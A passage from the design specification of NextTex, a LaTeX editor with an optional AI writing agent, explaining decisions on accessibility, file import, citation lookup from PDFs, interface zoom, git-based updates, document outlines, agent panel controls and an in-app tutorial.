measured, in both themes, in under a second.

### What the accessibility pass changed

axe-core over six states in both themes found four things, all of them the
app's own markup rather than a library's.

The document was an ARIA textbox with no name, so the one region of this app
that holds the writing was announced as an unlabelled input. It has a name
now.

The file tabs claimed `role="tab"` without a `tablist` around them, and each
tab contained its own close button — a control inside a control, announced
as one thing and reached as two. The fix was not to add the missing role: an
ARIA tablist promises arrow-key navigation between tabs and a panel
associated with each one, and this strip has neither, so claiming it would
tell a screen reader something untrue. The tabs are a labelled group of
buttons, the close button is a sibling rather than a child, and the open
file is marked with `aria-current`.

One rule is consciously rejected and written into the spec with its reason:
`scrollable-region-focusable` wants CodeMirror's scroller to be focusable
itself, when the focusable editable region inside it *is* how a keyboard
reaches and scrolls the document. Satisfying it literally would add a tab
stop that goes nowhere.

Beyond axe there are four checks it cannot make: that Escape closes what it
opens, that the composer is reachable by tabbing out of the editor, and that
the permission card's three answers are real buttons with real names — the
one control in this app where a mistaken click runs a command.

### Where the line is

Worth its maintenance: anything that asserts a contract, anything that
guards a safety property — path escape, atomic write, undo refusal, the
permission fence, history permanence — anything that encodes a bug already
paid for, and the handful of browser specs that prove the core loop still
works end to end.

Not worth it: snapshot tests of rendered React, which fail on every
intentional design change and assert nothing about behaviour; a second
browser spec for a variation the first already covers; tests that assert an
exact duration rather than a budget; and anything a unit test can pin down.
Every timing constant in the browser tier is a reason to prefer the layer
below it.

---

## 15. Making files, and putting files in

Everything above assumed files arrive somehow. They did — by drag-and-drop onto a row, or
through a menu hanging off one — and the assumption held right up until somebody needed a
folder in a project that had one file in it.

The work in this section came from a design consult, and two of its decisions are worth
keeping the reasoning for.

**The file picker opens before the destination chooser.** The obvious order is to ask where
the files should go and then open the picker. It is wrong: it costs two deliberate steps
before a file has even been chosen, every single time, including the overwhelmingly common
case where the answer is the same folder as last time. Opening the picker first means the
chooser appears *already knowing the filenames* — so "where do these go" and "one of these
is already there" become one question on one surface, instead of a two-page wizard. It also
means the chooser can decline to appear at all, which is what it does for a drop onto a
folder with no collisions: the gesture named the destination, so there is nothing to ask.

**A replacement is `op="replace"`, not an edit.** This looks like bookkeeping and is the
thing that keeps the feature honest. History collapses same-author edits inside ninety
seconds, which is right for typing and catastrophic here: export a plot, notice the axes are
wrong, export again inside a minute, and the coalescer merges the two replacements — keeping
the intermediate and dropping the version that held the *original* figure, which is the one
version the whole feature exists for. The coalescing test requires `previous.op == "edit" ==
op`, so a distinct op closes it by construction rather than by a special case. It is
deliberately *not* permanent: thinning a year of nightly re-exports is correct, and a
version somebody names is already permanent by its label.

Underneath both: replacing a figure used to destroy it. The route recorded a version by
reading the file as UTF-8 inside a `try` that swallowed the `UnicodeDecodeError`, so it
worked for a chapter and silently did nothing for a PNG. The blob store had never had
trouble with arbitrary bytes — `content()`'s `errors="replace"` decode had, which is right
for showing an old draft in an editor and turns every invalid byte of an image into U+FFFD.
There is a `bytes_of` beside it now, a `raw=1` form of the blob route that serves a version
with its own media type, and a read-only pane for files the editor cannot hold — without
which a figure's history is unreachable, since the only route to any file's history is to
make it the active document.

Two bugs turned up while building it, both in code that predated it. Creating anything at
the project root put a naming input under *every* file in the project, each one stealing
focus from the last, and the blur that follows cancelled it — the row hosting the input
compared a file's parent to `""` instead of only ever hanging off a folder. And the folder
list's arrow keys collapsed the list, because selecting an option and confirming the choice
were the same callback; selection has to follow focus with the list still open, or the
keyboard path is one keystroke long and ends in the wrong place.

What was added beyond the ask, and why each earns its place: the project root became a drop
target, because dropping a file at the root was previously impossible; a file that lands in
a collapsed folder is now revealed, expanded and flashed, because from the writer's seat it
had otherwise not landed; typing in the tree jumps to a file, which is the reason there is
no filter box in a bar 240 px wide; `Move to…` reuses the same folder chooser and the rename
route, which already fenced both of its paths; and an image pasted onto the tree becomes a
figure with a dated name, because screenshot-to-figure is a loop somebody runs all
afternoon.

---

## 16. Three agents, one of which is none

The agent was Claude, and the app was built around it closely enough that
"which model" looked like a setting nobody would ever need. Two things
changed that. Not everybody has a Claude account. And more importantly: a
writer who does not want an AI anywhere near their manuscript is not a lapsed
user of this app, they are its core user with one panel switched off.

So there are three providers, and the third is `none`.

**The seam already existed.** `ScriptedAgent` had been standing in for the
whole agent since the test suite was built, which is a stronger claim than
it looks: it proved the rest of the app depends on exactly eleven members —
`ask`, `events`, `busy`, `idle_seconds`, `disconnect`, `interrupt`,
`current_why`, `resolve_permission`, `set_model`, `model`, `usage`. Adding a
second real provider was writing a fourth implementation of a contract that
had already been exercised, not carving a new abstraction out of coupled
code.

**The OpenAI one is narrower on purpose, and the narrowing is the safety.**
The Claude SDK offers Bash, so that agent has to fence it: a permission
card, a rule scoped to the command's first word, a refusal to remember
anything for a compound command. Here the tool list is ours to write, so
there is no shell on it — a writing agent has never needed one except to
run the build, which is a tool of its own. And every path a tool takes is
resolved against the project root, so there is no out-of-project write to
ask permission about. `resolve_permission` returns `False` and says why,
rather than keeping a card that would never appear.

It has never spoken to OpenAI. There is no account here, so the transport
is stubbed and everything above it runs for real. What that cannot tell you
is whether OpenAI still returns these shapes, which is the same honest
limit the Anthropic side has and the reason `NEXTTEX_LIVE` exists.

**"None" removes the column rather than disabling it.** A greyed-out panel
down the right-hand side is a permanent advertisement for a decision the
writer already made. The editor and the preview take the width.

### The error pane had to grow up first

Switching the agent off exposed how much of the app's helpfulness was
routed through it. The error drawer showed what TeX said, and `Fix` wrote
that into the composer — which is no help at all to somebody with no
composer.

`nexttex/explain.py` is twenty-three rules over the errors that actually
happen, each with what it means and what to look for. `Missing $ inserted`
becomes *Maths outside maths mode* and *put the expression between dollar
signs, or write `\_` if you meant a literal underscore*.

The part worth defending is the summary strip. TeX cascades: one unclosed
brace produces a complaint from every paragraph after it, and the list in
the drawer is sorted with errors first, so a reader who works down it
spends the evening fixing consequences. The strip names the *first* error
in document order — nearly always the cause — and says plainly that the
rest usually follow from it. That is a sentence, not a feature, and it is
the most useful thing in the pane.

---

## 17. A folder of papers, and the citation that is never invented

Point NextTex at a directory of PDFs and it fills in the bibliography. The
rule that makes it worth having is the same rule that makes it hard: a
citation may never be composed from anything but a publisher's own record.

**Bulk import is where that rule is most tempting to soften.** A hundred
PDFs, ninety of them carrying a printed DOI, and a title search would
"probably" get the rest. It does not, and the refusals are written into the
design rather than left to the implementation: no DOI is guessed from a
title, no filename that looks close is trusted, and there is no *add all
suggestions* button — twelve individual clicks is the correct cost of
twelve papers that had no DOI printed in them.

**The safeguard that is not obvious.** A DOI printed on page one is
sometimes a DOI the paper *cites*. So after the record comes back, its
title is checked against the paper's own front matter, and a record that
does not describe the paper it was found in is refused. The check is folded
token containment rather than a substring or a similarity ratio, because
`pdftotext` hyphenates at line ends: `nitro-\nphenol` folds to `nitro
phenol` and a substring test would reject a paper that is unambiguously
right.

**Duplicates, at three scopes.** A DOI already in the file. The same file
content under two collections, caught by hashing the bytes before anything
is extracted — which is also what makes re-running the same folder cost
seconds. And, the one that would have been silently wrong, **citation keys
colliding inside a single run**: two papers by the same author in the same
year both become `Marcus1993`, and the second shadows the first in every
`\cite` without LaTeX complaining. The growing `.bib` text is threaded
through each lookup so the disambiguator sees the entry added a moment ago.

**Why this is not a `ProjectContext` document.** That mechanism copies the
bytes, lists every document in the system prompt on every turn, and exists
to distil things. All three are wrong for two hundred papers: the copy is
600 MB of duplication, the listing would be two hundred lines paid for on
every turn, and there is no useful distillation of a literature collection.
The operation you want is *search*. So the library indexes the text that
had to be extracted anyway and contributes a fixed four lines to the
prompt, whatever its size.

**The path fence is not involved, extended, or excepted.** `Project.resolve`
answers one question — can this client-supplied relative path escape the
project it names — and it keeps answering only that. A Zotero folder is not
in the project and never will be. What guards the browse route instead:
it is read-only, it returns folder names and PDF counts and never file
contents, it does not follow symlinks, and **no tool the agent can call
reaches it**. A PDF is a file the writer downloaded from the internet, and
a tool that turned "read this folder" into an argument the model chooses
would be a path from a downloaded paper to the writer's home directory.

For the same reason, what `search_library` returns is framed as quotation
rather than instruction, and snippets are capped so no long instruction
block survives intact.

## 18. Two installs, updating from the page, and a size the reader chooses

Three things, and each one turned on a fact that had to be measured rather
than reasoned about.

### Why the interface size is a `zoom`

The type scale is fixed pixels and so is the geometry around it — `h-[28px]`
controls, `h-[26px]` rows, `w-[264px]` cards. Scaling only the type would put
21px text in a 28px control. So the interface size scales the whole
composition: `zoom` on `#root`, which is the parent of *every* view, including
the loading, sign-in and project-list screens that return before the editor
shell is ever built. One line covers all of them, with nothing threaded
through `App`.

Editor text is the opposite case and gets the opposite mechanism: one CSS
variable on `.cm-scroller`, with a **unitless** line height so it tracks the
size. A fixed `22px` under 21px text is unreadable. The gutter follows at the
ratio it had at the default.

**`zoom` leaves the app straddling two coordinate spaces, and the two halves
are not symmetrical.** Measured in Chrome at 150% rather than assumed:

- **Reads are in viewport pixels.** `getBoundingClientRect()` on an element
  inside the zoomed subtree returns 900 for something whose own `left` is
  600px. `MouseEvent.clientX` and `window.innerWidth` agree with it, so reads
  can safely be compared with one another.
- **Writes are in zoomed pixels.** `style.left = "600px"` on a fixed element
  inside the subtree renders at viewport 900.

So the bug is never in the reading. It is in taking something read and either
writing it back as a style, or comparing it against a literal from the
stylesheet — both of which live in zoomed space. `viewport.ts` holds the
conversion; eight sites use it. The rule for new code: **convert once, at
capture**, so anything stored in state is already in the space a style is read
in. Converting again at the point of use double-counts, which is exactly the
bug that arises when the capture and the use are in different files.

Two consequences that are easy to miss:

- The preview would have gone soft. Its canvas is sized from
  `devicePixelRatio`, which `zoom` does not change, and *nothing invalidated
  it* — a scale change is not a relayout. The resolution is read per render
  and an appearance event marks the pages stale.
- Container queries need no help. `Status.tsx` and the `@[208px]:` rules in
  `Chat.tsx` measure their container in its own scaled space, so a larger
  interface drops optional segments sooner. That is correct: bigger text does
  leave less room.

Ctrl-wheel over the editor steps the text size, mirroring the preview's own
gesture — and, like it, the listener must be native, because React registers
`wheel` passively and `preventDefault` inside `onWheel` is ignored. There are
deliberately **no** Ctrl-plus/minus bindings: the browser owns those, they are
what a reader reaches for first, and browser zoom already scales this app
correctly. Taking the keys away to do a worse version of what they already do
is a net loss.

Theme, interface size and editor size live in one popover behind an `Aa`
button. The theme costs a second click now; in exchange three related controls
fit a 32px rail header at its narrowest width. The trigger is letters rather
than the old sun and moon because that glyph already means *switch the theme*,
and making it open a menu instead would break a meaning the app had taught.

### Which commits count as an update

NextTex is always a git checkout — no package, no version string — so "is
there an update" is a question about `git`. The interesting half is the second
question. Most commits to a project like this one change documentation or
tests, and telling somebody every session that three commits exist when none
of them changes the program they are running is a nag rather than a service.

Every commit is classified by the paths it touches: `frontend/` is
*interface*; `docs/`, `README.md`, `LICENSE`, `tests/`, `e2e/`, `bench/` and
`examples/` are *neither*; everything else, **including anything
unrecognised**, is *app*. Failing towards "something changed" is the right
direction: a wrong "nothing to see here" costs more than a wrong alarm.
`scripts/` counts as app because it changes what the *next* update does.

The label and the rebuild question are **separate fields**, which was learned
the hard way. Reading "does the bundle need rebuilding" off the single label
meant a commit touching a Python module *and* a React component came back
"app" with `rebuild` false — new server code installed behind the interface
that was already built, which is the exact failure the check exists to
prevent.

The screen fires the check after it has rendered and never awaits it, and the
fetch gets a ten-second timeout of its own rather than the module's 120: a
fetch with no route to the network would otherwise hang for two minutes on the
screen the writer opens every session. A check nobody asked for is silent when
it fails; an install on an offline tailnet must not open onto a red line every
morning.

### Restarting, and why it is a nonce

`serve()` keeps its `uvicorn.Server` objects as locals and `main.py` holds no
reference to them, so **no route can ask for a graceful shutdown**. The exit
*is* the restart: systemd's `Restart=on-failure` and launchd's
`KeepAlive.SuccessfulExit=false` both bring a service back after a non-zero
exit and leave it down after a clean one. Windows registers a logon task,
which is not a supervisor, so there the writer is told to start it again.
Supervision is detected from `INVOCATION_ID` or `XPC_SERVICE_NAME`.

The page then polls for a **boot nonce**, regenerated once per process, not
for the commit sha. The question being asked is "did a different process
answer", not "did the code change": an update that pulls nothing still
restarts, and waiting for a sha that never moves would time out for no reason.
A tab that *joins* a running update starts that poll immediately rather than
waiting for the stream to end, because the stream replays the output collected
so far but not the `done` event — a tab arriving after the job finished would
otherwise wait for a message that has already been and gone.

**An inherent property worth knowing: the code that performs an update is the
old code.** A bug in the updater is therefore only fixed one update later.
That is not a design choice and cannot be avoided; it is a reason to keep this
path small and to test it against a real service, which the browser tier
cannot do — it spawns the server itself, with no supervisor, so a non-zero
exit simply kills it.

### Two installs on one machine

One environment variable, `NEXTTEX_INSTANCE`. Unset is the ordinary install
and nothing changes. Set, it moves the state directory aside
(`~/.local/share/nexttex-dev`), names the service `nexttex-dev`, and derives a
default port from the name — because two NextTex both defaulting to 8450 means
the second refuses to start with a message about a port rather than about what
the person was doing. The name is validated as a single path segment: it is a
label, never a way out of the directory.

A named instance carries a badge in the rail, on the project list and in the
tab title, in `--warn` rather than the accent, because it is a caution rather
than a feature. The ordinary install shows nothing — almost every install is
the only one on its machine, and a badge reading "the normal one" is noise.

## 19. Navigating a long document, and where the agent's controls belong

Three changes, all of them about a project that has grown past the size the
first design assumed: a rail that could only list files, an agent header with
five things in it, and a panel that had to be folded by hand.

### The rail is a stack of panels, and Files is one of them

The rail held one thing that could not fold — the file tree — and four that
could: the trash, the papers, what the agent reads, and git. That was right
when a project was a handful of files. It stops being right the moment a
document is long enough that finding a section matters more than finding a
file, because the tree then occupies the whole rail to answer a question
nobody is asking.

So **Files becomes a panel like the others**: a 26px header with a label and a
chevron, in the same idiom as `TrashPanel`. It keeps `flex-1` when open, so
nothing about the ordinary arrangement changes. Folded, it gives its height to
Sections.

The tree is **unmounted when folded rather than hidden**. It owns a 700ms
type-ahead and a roving tab stop, and both would still answer the keyboard
from behind a closed panel — a key press that jumps a list you cannot see is
worse than one that does nothing. The cost is that the tree's expanded
folders reset when it comes back; that state was never persisted across a
reload either, so this loses nothing that survived a refresh.

### Sections reads the source, not the .toc

LaTeX already writes a table of contents, into `main.toc`. Using it was the
obvious first thought and the wrong one: a `.toc` exists only after a
successful build and describes the document as it was when that build
started. A writer adding a section wants it in the outline while they are
still typing the title, not one compile later — and a document that does not
currently compile would have no outline at all, which is exactly when
navigating it is hardest.

`frontend/src/outline.ts` therefore parses the buffer. It scans once with an
index rather than matching per line, because three things fall out of that for
free: a title can run across lines, a `%` can hide a heading, and a
`verbatim` block can contain something shaped like one. Line numbers stay
exact, which is what the jump needs.

`\include` and `\input` are listed alongside the sectioning commands and sit
at chapter depth, because **in a skeleton document they are the outline**. A
dissertation's `main.tex` contains no prose and eight `\include` lines; its
table of contents is that list. Clicking one opens the file it names,
resolved against the main file's directory rather than the including file's,
which is how LaTeX itself resolves it.

The outline is recomputed on a 250ms timer behind the keyboard. That timer
used to be the autosave's, and the outline was deliberately refreshed
*before* the save, so that a file whose save was refused did not show the
outline it had when it was last written for as long as the conflict stood.
There are no refused saves any more (§22) and the timer is now only about not
re-parsing a long chapter on every keystroke. `sameOutline` compares the
result and keeps the old array when nothing moved, so typing prose does not
re-render the panel.

The row under the caret is marked with `aria-current` and a small dot rather
than a rule or a heavier weight: the mark moves as the writer types, and a
mark that changes a row's size would shift every row below it several times a
minute. Above the first heading nothing is marked, because that is a real
place to be in a file and not a reason to point at the first section.

### The agent's controls moved under the box

The chat header is 32px and carried the name, what the agent is doing, the
Auto chip, Stop, the usage tally, an overflow menu and a fold chevron. Seven
things in a bar that narrows to 280px is four too many, and the overflow menu
was where the crowding had already been swept.

New conversation, model and auto mode are now **icons in a row under the
composer**, beside Send, with "Template and voice" joining them. Every one of
them is something you reach for while writing the question, so under the box
is where the hand already is; and the row costs no more width than the single
text button it replaces.

Two rules held while moving them:

- **The Auto chip stays in the header.** The icon is the *toggle*; the chip is
  the *state*. A mode that disables the permission fence and survives a
  restart has to be visible without opening anything, and the header is the
  part of the panel that is always on screen.
- **The confirm still asks in place.** "New conversation" opens its two
  buttons above the composer rather than in a dialog, in the same idiom as
  the setup block, so the sentence has room to say that the record is kept.

The icons are five hand-drawn paths at 13px. An icon set would have been
faster to write and would have cost tens of kilobytes on a bundle with about
24kB of headroom.

The model popover opens upward from its button and dismisses through the
anchor-aware `useDismiss` — the same hook, with the same trigger ref, that
the usage panel needed. Any new toggle popover in this app must pass its
anchor or it will close on `pointerdown` and reopen on `click`.

### Several previewed documents

A project builds one document per previewed file rather than one per
project. `esi.tex` beside `main.tex` is the case: two documents in one
folder, neither including the other, and before this the only way to build
the second was to make it the main file and change it back.

Three things had to become per-document that were per-project: the preview
stand-in (now named after its document and written beside it, which is what
the compiler's module docstring always said it needed), the scope marker
recording whether a PDF is whole or an `\includeonly` slice, and the
scheduler with its own idea of whether the next build must be a full one.
Jobname collisions are refused with a 409 rather than worked around — two
documents whose stems match would each serve the other's page, and a build
directory per document would move `main.pdf` and break every Makefile
pointed at it.

**What rebuilds on a save is decided by `nexttex/deps.py`**, which follows
`\input`, `\include`, `\subfile`, `\includestandalone`, `\import`,
`\bibliography` and `\includegraphics`. Its two fallbacks are asymmetric on
purpose: an unrecognised `.tex` goes to the first document only, because the
usual unknown is a file just created and not yet included anywhere; an
unrecognised asset goes to every document, because under-attributing one
leaves a preview that silently stops updating.

**Builds queue rather than run together**, one at a time across the project,
with the visible tab first. Each scheduler already serialises itself, but two
`latexmk` runs in one build directory would write over each other's
`.fdb_latexmk` and biber temporaries. There is no preemption: a running build
is never abandoned for a newer one of a *different* document, and superseding
a build of the *same* document happens before the queue is joined — a request
that queued first would otherwise wait for a slot held by the build it means
to replace.

Below 900px the preview has no header of its own, so the strip shares the
row that carries the source/preview toggle. Without that there was no way to
change document with a mouse at that width — the same hole the agent button
had, in the same place, for the same reason: a control that lives in a pane
disappears with the pane.

### Text on the page can be selected

The preview was a canvas, so the page was a picture: it could not be
selected, searched or copied out of, which for a document somebody is quoting
from is most of what a PDF is for. Each page now carries a `pdf.js` text
layer — transparent spans positioned over the glyphs — built only for pages
on screen and only once per page per build.

Held to the pinch benchmark, which is the thing that could have made this a
bad trade. Over sixty wheel events in twenty frames: layouts stay at 40, the
number that mattered, and the whole gesture costs about 3.8 ms more in style
and script — under 0.2 ms a frame. During a zoom the layer is transformed
rather than rebuilt, because rebuilding several hundred spans per frame is
precisely the cost the coalescing handler exists to avoid; without it a
selection made mid-gesture would land a word out.

Pointer events pass through the layer and are taken only by its spans, so the
double-click that jumps to the source still reaches `.nx-page` beneath it.

### One shortcut, and why it is not Super-A

The agent panel is two different things depending on width: below 1400px an
overlay that slides over the preview, above it a column that folds. One
shortcut has to do whichever is on screen, and opening it puts the caret in
the box — a shortcut that opens a panel you then have to click into has saved
nobody anything.

Super-A was asked for and is not available. On Linux the window manager takes
Super before the browser sees it; `Cmd/Ctrl-A` alone is Select All, which an
editor cannot give up; `Cmd/Ctrl-Shift-A` is Chrome's own tab search; and
`Cmd/Ctrl-/` is CodeMirror's toggle-comment, bound by `defaultKeymap`. **The
binding is `Cmd/Ctrl-Alt-A`**, which keeps the A — the part worth keeping —
and is free in both keymaps and both browsers. It is read from `event.code`
rather than `event.key`, because with Alt held macOS reports the character
the combination would type.

**Escape closes it from inside it, and never opens it.** Scoped rather than
global, and the first attempt was global: Escape is also how a keyboard gets
out of CodeMirror — where Tab indents rather than moving on — so a binding
that listened everywhere shut the panel every time somebody pressed Escape
to tab away from the editor, and the accessibility spec that tabs from the
editor to the composer caught it. Escape dismisses the thing you are in,
here as everywhere else in the app. The pairing with `Cmd/Ctrl-Alt-A` still
holds, because that shortcut leaves the caret in the composer.

Two things still have to be true. The tutorial, the history panel and the
context sheet own Escape while they are open, and close themselves. And a
popover *inside* the panel claims it by preventing the default — a claim not
visible synchronously, since window listeners run in the order they were
added and those components mount long after the shell, so the decision waits
a turn and then reads `defaultPrevented`.

### One way to the agent, floating in the corner

The agent used to be reached by two controls that were never both present: a
vertical strip at the right edge above 1400px, and a button in the editor's
tab row below it. That button lives inside the editor pane, which is hidden
when the source is folded away and when the preview has the window below
900px — **so in two ordinary layouts there was no way to reach the agent with
a mouse at all**, only `Cmd/Ctrl-Alt-A`. Both e2e cases now exist.

One control instead, in the shell rather than in any pane, in the same corner
whatever the layout is doing: a floating pill above the chat overlay's `z-30`
and below the tutorial's `z-40`, clear of the 26px preview footer and of the
centred toasts. It travels left by the panel's width when the panel is
docked, so the panel never covers the thing that closes it.

It carries the provider's mark rather than its name alone, drawn as geometry
rather than traced — a trademark reproduced badly from memory looks worse
than no logo, and the name is beside it either way. On the mark sits a state
dot fed by `thinking` and `awaitingPermission`. That dot earns its place:
*the agent is waiting for you to allow something* was invisible whenever the
panel was closed, which is precisely when it needed saying. It breathes
rather than spins — a turn can run for a minute, and something spinning for a
minute reads as an error long before it reads as progress.

### The rail scrolls rather than pushing its panels out

Every expanded panel in the rail is `shrink-0`, which is right: a list
squeezed to two rows is worse than one you scroll to. But the column had no
answer for their natural heights adding up to more than the rail is tall, and
the lower ones were simply pushed out of the pane — on a fourteen-chapter
project at 700px, "What Claude reads" sat 184px below the bottom with no way
to scroll to it. The stack is now its own scroll container. `min-h-0` matters
as much as the overflow: a flex child will not scroll until it is allowed to
be shorter than its content.

### Reaching for the preview puts the overlay away

Below 1400px the panel lies over the preview, and the click that means "let me
read this" was leaving it covered. A `pointerdown` on the preview pane now
closes the overlay — `pointerdown` rather than `click` so it lands before the
preview header's own single/double-click timer and never turns a fold into a
mode change, and nothing is prevented, so the click still reaches the page.

Only when the panel is actually covering something. Docked, above 1400px,
clicking the preview does nothing to it: a panel that vanished on every click
into the document would be unusable.

While the specs for this were being written, the same double click that
enters reading mode was found to leave the project. The preview header shows
the project controls in place of its own label once the rail has folded away,
which in reading mode it always has — so the second half of the gesture landed
on "switch project". The controls moved to the right of the bar, beside the
fold chevron. The left of a header a writer double clicks has to stay inert.

### What the design review changed

Rendered at four widths in both themes and read against this document. Six
things it found, in the order they mattered.

**The auto-mode switch was never `--warn`, and turned `--hint` under the
pointer.** The icon carried `text-warn`, but `styles.css` is imported after
Tailwind and unlayered, so `.quiet { color: var(--ink-3) }` beats any colour
utility from `@layer utilities`. Worse, `.quiet:hover:not([data-tone])`
repainted it to `--hint` on hover: the one control that lowers the permission
fence turned the colour that means "safe and interactive" at the moment your
pointer reached it. The stylesheet's own comment names this exact failure for
a Delete control. The fix is the escape hatch already there: a new
`.quiet[data-tone="warn"]` beside `[data-tone="danger"]` and `[data-tone="on"]`,
and `data-tone` on the buttons instead of a utility class. Moving `.quiet`
into a layer would have fixed it and broken every other place the build
relies on that precedence.

**The two blocks that open above the composer were unreachable by keyboard.**
They render before the textarea and their triggers come after it, so Tab from
the trigger walked forward past them and never arrived. Both now take
`useDismiss` (which brings Escape and outside-press with it), move focus into
the block on open and hand it back on close. The new-conversation block
focuses "Keep this one" rather than "Start new": it ends a conversation, so
the default answer is no.

**Every section was a tab stop.** §10 records fixing precisely this for the
file tree, which is one stop with arrow keys rather than forty. The list now
does the same, with Home and End.

**An `\include` for a file that is not there did nothing, silently.** A
chapter not yet written is the normal state of a skeleton document, and a row
that hovers and answers nothing is worse than one that says so. Those rows
are drawn `--ink-3` and disabled, which also names the compile error coming
next.

**The preamble was heading the table of contents.** A dissertation's main.tex
loads `preamble/formatting` and `preamble/macros` with `\input` before
`\begin{document}`, so the outline opened with two rows of machinery. Includes
seen before the document begins are dropped, but only if the file begins one
at all: a chapter is included into something else and has no preamble to
separate, so everything it pulls in stays.

**Two spec deviations.** Rows were 24px against §4's 26, and indented by 11px
against §5's 13 -- which is the width of a lowercase *n* and the reason the
file tree indents the way it does. Both corrected, so the two lists in the
rail sit on one grid.

The caret row also took a `--surface-2` fill on top of its dot, which made it
the one row in the panel that did not answer the pointer. The dot carries it
alone, as this section said it should.

Left alone, deliberately: the model popover covers the composer while it is
open. Detaching it from its button to clear a half-written question would
read as a floating panel rather than a menu, and the draft is still there
when it closes. And folding Files takes the file actions with it, which is
the reachability hole `FileTree` argues against -- but the fold is explicit,
one click reverses it, and the alternative was to drop the panel header the
rail's whole new idiom rests on.

The rail's fold button still says "Fold the file list away" though the rail
now holds six panels. Renaming it collided with the agent panel's own "Fold
this panel away", which two specs address by name, and every unique
alternative left the button and the strip it folds into ("Show files")
reading as a mismatched pair. The file list is still the bulk of what is
there.

## 20. A tutorial that can be read while you use the thing it describes

The app explains itself well in places — the status strip names the first
error in English, the git panel offers a repository before you ask, the
welcome message says what the agent is for — but none of that adds up to an
answer to "what is this and how do I use it". `docs/first-session.md` is
that answer and it is not reachable from the app, which over Tailscale may
be running on a machine the reader does not have the repository on.

### It is a sheet, and it does not dismiss

The shape was the whole design question. Every dialog in this app is a small
anchored card, 248 to 320 px, and each one closes on an outside press. A
tutorial with nine sections and six figures is an order of magnitude more
content than anything the app shows at once.

**A right-hand sheet, 380 px, full height, over the preview.** `History` is
the precedent: it is the one existing surface that is a full-height sheet
*and* the one surface that does not call `useDismiss`, so it stays open
while you click around the editor. That second property is the whole reason
it is the right model here. A tutorial whose third section says *"a single
click on a pane's header folds that pane away"* and then closes the instant
you try it is worse than no tutorial.

380 rather than History's 264 because body text at 13/20 inside 356 px of
measure is about 58 characters, inside §3's 68ch ceiling; at 264 the measure
is 40ch and a figure would be 240 px wide, below legibility for anything
containing interface text.

It never docks, and that is arithmetic rather than taste. At the 1400 px
breakpoint the rail and the agent already take 620 px, leaving 780 for an
editor and preview whose minimums total 740. A docked tutorial column would
need a window around 1800 px before it fit, so the flag would be dead code
at every width most people run.

It covers the preview because the preview is the one pane no section asks
you to touch: the rail's panel headers, the tab strip's empty run, the
gutter, the status strip, the composer's icon row and the git footer all
stay visible behind it. Below 1400 px the agent is itself an overlay over
the preview, so opening the tutorial puts it away — the same handoff, for
the same reason, that the preview pane already performs on a pointer press.
Closing the tutorial does not bring the agent back; `⌘⌥A` does, and the
tutorial's own shortcut table names that key two sections away.

Rejected, each for a reason particular to this app: a **centred modal**,
because §5 says plainly *"never a modal — this app has none"*, and because
it would cover the tab strip, gutter and status strip that half the content
points at; a **new `view`**, because it would unmount the editor and throw
away the layout the reader is being taught about; a **rail panel**, because
the rail auto-collapses below 1100 px and cannot describe itself while
covering itself; **disclosure inside the Settings card**, because 248 px
fits neither the prose nor a figure, and because that card calls
`useDismiss`, so the first attempt to try a gesture would close it.

### Contents fixed, document scrolling

This is reference material as much as a first read, and both uses are served
by one arrangement: a single scrolling document ordered by when you meet
each thing, under a contents block that never scrolls away, so any section
is one click from anywhere. Nine rows at 26 px is what makes the block fixed
rather than scrolling, and a tenth section is the practical signal to cut
one instead.

Not an accordion: Ctrl-F finds nothing inside a collapsed panel, and a
return visit would have everything shut again.

The row you are in takes `aria-current` and a dot, and nothing else — §19
already recorded why a fill is wrong there, and the same argument applies:
it would make the current row the one row that does not answer the pointer.
One tab stop with arrow keys, not nine, for the reason §10 and §19 both give.

### Figures

Six, in both themes, and the selection rule is what keeps it to six: **a
screenshot earns its place only if it shows an unlabelled target you cannot
otherwise point at, or a state that is not currently on screen.** The reader
is inside the app, so a picture of something visible and already labelled is
the least informative figure there is. That rule cuts the obvious first idea
— there is no overview shot of the four panes, because the reader is looking
at them.

What survives: the tab strip's empty run (invisible by definition), the
errors drawer (a state you cannot conjure without breaking your document),
an edit chip opened to its diff, a permission card, the composer's row of
unlabelled buttons, and the git card that never returns once dismissed.

`prefers-color-scheme` is the wrong test for choosing between them. §2 is
explicit that the theme here is *"authored and chosen, not inherited"* and
stamped on the root; `e2e/shots/hero.spec.ts` already carries the scar from
assuming otherwise. The figures read `data-theme` and follow the
`APPEARANCE_CHANGED` event, so switching theme with the sheet open moves
them in the same frame as everything else.

Every figure carries `width` and `height` so nothing reflows as images
arrive, its caption says what to look for, and its alt text says what the
picture is — they are not the same sentence.

**The figures are generated, not cropped by hand**, by `e2e/shots/tutorial.spec.ts`
and regenerated with one command:

```
cd e2e && node_modules/.bin/playwright test --config shots.config.ts tutorial.spec.ts
```

This document's opening rule is that the build and the specification may not
drift silently. A hand-made screenshot of an interface that has since moved
on is exactly that drift, in the one surface whose entire purpose is to
describe the build.

### Cost

Both surfaces are `React.lazy`, as `Pdf` already is. The initial chunk grew
**1.6 kB** — two `lazy()` calls, two buttons and two booleans — against a
760 kB budget; the tutorial itself is a 25 kB chunk and the guide a 2 kB one,
neither fetched until opened.

One deviation from the plan, recorded rather than hidden: four of the
figures are under Vite's 4 kB inlining threshold and are therefore base64 in
the tutorial chunk rather than separate files. The intent of the rule was to
keep images out of what a first visit downloads, and that is satisfied —
they are inside a chunk nobody fetches unless they open the tutorial. Raising
`assetsInlineLimit` to zero would have changed asset handling for the whole
app to tidy 12 kB inside a lazy chunk.

### The projects screen gets a different, smaller thing

A question mark left of the cog, wearing the cog's own chrome so the two
read as a pair, opening a 320 px popover in the `PapersChooser` idiom. It
*does* call `useDismiss`: nothing behind it needs trying mid-read, and a
card that follows you around the project list is what that hook exists to
prevent.

Eight labelled lines and no figures at all — every one of them describes
something visible behind the card, which is the figure rule applied
honestly. The two surfaces therefore share their type scale and their
`Section`/`Keys` primitives but not their component: they differ in width,
fill, radius, positioning, focus behaviour, dismissal and whether they carry
images, and a `variant` prop switching all six would be two components
wearing one name.

### Nothing is remembered, and it never opens itself

No stored progress, no scroll restoration, no auto-open on first run. §4
already refused an auto-opening drawer in a passage written about exactly
this temptation, and the app does first-run orientation where it belongs —
`welcome.ts` puts three paragraphs and two buttons in an agent panel with no
conversation yet. A tutorial opening on top of that would be two welcomes
competing for the same thirty seconds. Reopening lands at the top rather
than where you left off, because somebody reopening it is asking a different
question from the one that closed it.

### What was left out, and one thing that was found

Installing, the token in the URL and the `.nexttex/` directory tree stay in
the README and `first-session.md`: the reader is inside a running app, so
the first two describe a problem they do not have.

**Choosing the agent could not be documented, because it cannot be done.**
`api.chooseProvider` is reachable only from `SignIn`, which mounts only when
